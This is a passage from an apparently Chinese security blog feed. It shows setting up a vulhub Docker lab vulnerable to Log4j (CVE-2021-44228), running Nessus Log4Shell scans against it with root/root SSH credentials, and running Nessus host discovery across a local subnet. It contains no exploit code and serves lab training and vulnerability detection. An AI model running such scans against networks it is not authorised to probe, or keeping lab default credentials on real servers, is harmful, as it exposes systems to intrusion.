&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;chmod +x /usr/local/bin/docker-compose&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ls /usr/local/bin/&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/1a52eca9ba98451e9944261df831b9e1.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;4.4 查看版本&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;docker-compose -version&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/2e178bf8083d40e8a8a2a4626dce321a.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;h5 id=&#34;5安装vulhub&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#5安装vulhub&#34;&gt;#&lt;/a&gt; 5. 安装 vulhub&lt;/h5&gt;
&lt;p&gt;5.1 创建 zsoft 文件夹&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cd /www/wwwroot/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ls&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mkdir softs&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ls&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cd softs&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/100e72d253494a77865a0ef28e3853e0.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;5.2 下载 vulhub, 并查看&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;git clone https://github.com/vulhub/vulhub.git&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ls&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cd vulhub&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ls&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/f07e9e024a4845c3b9b041e2e551536d.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;h5 id=&#34;6部署log4j靶场&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#6部署log4j靶场&#34;&gt;#&lt;/a&gt; 6. 部署 log4J 靶场&lt;/h5&gt;
&lt;p&gt;6.1 进入 log4j/CVE-2021-44228&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cd log4j/CVE-2021-44228&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ls&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/dac22ab5392b42ceb89fdb2d04f1f6cf.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;6.2 编译环境&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;docker-compose build&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/8826d479399247d19cac4368b5584a13.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;6.3 运行环境&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;docker-compose up -d&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;6.4 查看端口&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;docker-compose ps&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;docker ps&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/99dbccec16e8460cb65771e03b010197.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;6.5 查看 ip&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ip a&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/b864d9f810564857a93c5eb342240344.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;6.6 宝塔面板放行端口&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/5398f901945340fb9f0531283655dd15.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;6.7 访问靶场地址&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.110.198:8983&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/f19a24723ea74f90bfbd516c97ac17fc.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;2扫描log4j漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2扫描log4j漏洞&#34;&gt;#&lt;/a&gt; 2. 扫描 log4J 漏洞&lt;/h2&gt;
&lt;h3 id=&#34;1log4jshell扫描&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1log4jshell扫描&#34;&gt;#&lt;/a&gt; 1.log4Jshell 扫描&lt;/h3&gt;
&lt;p&gt;1. 访问 nessus 扫描网站&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;https://192.168.110.230:8834/#/&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/5312ef585b90494393ac1c3836733512.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;2. 登录后，点击【新增扫描】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/d7b219844c3d4be4a870a9172bd1a0c8.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;3. 选择【Log4Shell】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/879dab939e1948fe88055cce194c4472.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;4. 输入 Name【log4jshell】，目标【192.168.110.198】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/2c9bafcb837e4b10acdfe1796110af16.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;5. 点击【发现】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/54e3442117ad4a51808430dcd3d9004a.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;6. 选择扫描类型【彻底】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/27cc3ab79bf54b9da3af319a2d8ed9ff.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;7. 点击【评估】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/249465aabe16419b9480bc51108f7922.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;8. 选择扫描类型【默认】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/1be69e69dc224a41bab404c4918e0e4f.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;9. 点击【证书】, 点击【ssh】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/e39419bb80074bfc9a6f0173912c924d.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;10. 选择身份验证方法【密码】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/ae7649df348d424397281fcfb273e6d0.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;11. 输入被扫描服务器的用户名【root】，密码【root】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/20a706aa71c149f988c2bd3a0a8c91d1.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;12. 点击【插件】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/d55fa35e69ea42768a03f1513c35f1ef.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;13. 点击【保存】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/f9ea1593922343a58b2ce767e674cdf0.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;14. 执行【log4shell】扫描&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/d7721cd40f2d4817b55c50dccb64b0b5.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;15. 查看 log4J 的扫描结果&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/366adf34bbb8440ba60b270fdcf51d87.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;2nesuss扫描log4shell-漏洞生态系统&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2nesuss扫描log4shell-漏洞生态系统&#34;&gt;#&lt;/a&gt; 2.nesuss 扫描 Log4Shell 漏洞生态系统&lt;/h3&gt;
&lt;p&gt;1. 访问 nessus 扫描网站&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly8xOTIuMTY4LjExMC4yMzA6ODgzNC8jLw==&#34;&gt;https://192.168.110.230:8834/#/&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;2. 点击新建扫描&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/3e85bf0e4380479b8df37afeb85973e5.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;3. 选择【Log4Shell 漏洞生态系统】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/24fc6288d71340efae4d97bd5ad9f870.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;4. 输入 Name【log4jshell 生态】，目标【192.168.110.198】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/5fe55d20097c458db27204caad1b22af.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;5. 点击【发现】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/5b8e5e6b086742fe85a816475ef782bc.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;6. 选择扫描类型【彻底】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/525da2c8e3684e69a3e7ebde40302d61.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;7. 点击【评估】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/99012fc379dd4e27aec5c0a4e3f2c1f8.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;8. 选择扫描类型【默认】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/4ea0cce3414643abb0cce510e0b882b4.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;9. 点击【证书】, 点击【ssh】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/7c20e6d3e7824e95ba02c85bc7722628.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;10. 点击【插件】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/741be19fc5044b4c84da53ecdf6bab9f.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;11. 点击【保存】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/5e45a982324f4b14a7c17e016f0c5b9f.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;12. 执行【log4shell 生态】扫描&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/fc08c461762b4f96aa936946747c4e05.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;13. 查看 log4J 生态的扫描结果&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/3192b68ad96e4e9aaaff70e36b057477.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
</content>
        <updated>2023-01-10T21:38:46.000Z</updated>
    </entry>
    <entry>
        <id>https://mangpumo.github.io/2023/01/11/NessusHostDiscovery/</id>
        <title>NessusHostDiscovery</title>
        <link rel="alternate" href="https://mangpumo.github.io/2023/01/11/NessusHostDiscovery/"/>
        <content type="html">&lt;h1 id=&#34;nessus-host-discovery&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nessus-host-discovery&#34;&gt;#&lt;/a&gt; Nessus Host Discovery&lt;/h1&gt;
&lt;p&gt;1. 启动 nessus&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cd nessus&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh qd_nessus.sh&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;2. 进入 nessus 网站&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;https://192.168.3.47:8834/&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/7ab2d5aa1c7a436d9a4236390971d873.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;3. 点击【New Scan】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/ae91d3e49a014ce4bf5d16e14d4c009a.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;4. 选择【Host Discovery】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/6314833fd6b24fc482bbf884bdeb3bd4.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;5. 输入 name【主机发现】，Description【主机发现】，Targets【192.168.3.0/24】, 点击【Save】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/9af5119ff47a41ef9f14fc1edd751799.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;6. 点击【 Schedule】&lt;/p&gt;
&lt;p&gt;这里是配置定时任务的，可以忽略&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/32d9e17742fa4afb8942d1cf5db96ba6.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;7. 点击【 Notifications】&lt;/p&gt;
&lt;p&gt;这里主要是配置邮件提醒的，可以配置也可以忽略&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/c65ec8c79ceb4e16a91630ce6bfcddf5.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;8. 点击【Discovery 】&lt;/p&gt;
&lt;p&gt;这里选择常用端口扫描&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/7c9a0ee9cc2b48bfa166e80f991819c5.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;9. 点击【Report 】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/a768bfa493014b299c4cf4aca1346474.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;10. 点击【Advanced 】&lt;/p&gt;
&lt;p&gt;这里是高级设置选项&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/07171ac22bdb481a97298199b7a36636.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;11. 点击【Plugins】&lt;/p&gt;
&lt;p&gt;这里是配置插件的地方，主机发现不要配置插件&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/1b538e5621c64332a3ee06cd862080b0.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;12. 点击【保存】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/193ae3a3dbd145b88480bb71deb6e721.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;13. 点击【主机发现】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/2fe3b92bf40640bea04bc8ecbb12a487.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;14. 点击【More】，点击【Launch】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/7abedbdf5cb94f9faafa11eec2017cca.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;15. 点击【Launch】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/bda6368a8f0a48d5a42370ce5a7bf537.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;16. 点击【主机发现】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/de021dcff58f431c9ceee57cd0354fae.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;17. 查看扫描结果&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/a9678c7f935a4213bfdd401d11ed91ae.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;18. 选择其中一个主机查看&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/0a1af822d924498bb1c20ed9a3675b4e.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;19. 查看具体的扫描结果&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/c8b48d3a6f4241d6a9be2a6bf3b678e3.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
</content>
        <updated>2023-01-10T21:38:08.000Z</updated>
    </entry>
    <entry>
        <id>https://mangpumo.github.io/2023/01/11/Nessus%E4%BB%8B%E7%BB%8D%E4%B8%8E%E5%AE%89%E8%A3%85/</id>
        <title>Nessus介绍与安装</title>
        <link rel="alternate" href="https://mangpumo.github.io/2023/01/11/Nessus%E4%BB%8B%E7%BB%8D%E4%B8%8E%E5%AE%89%E8%A3%85/"/>
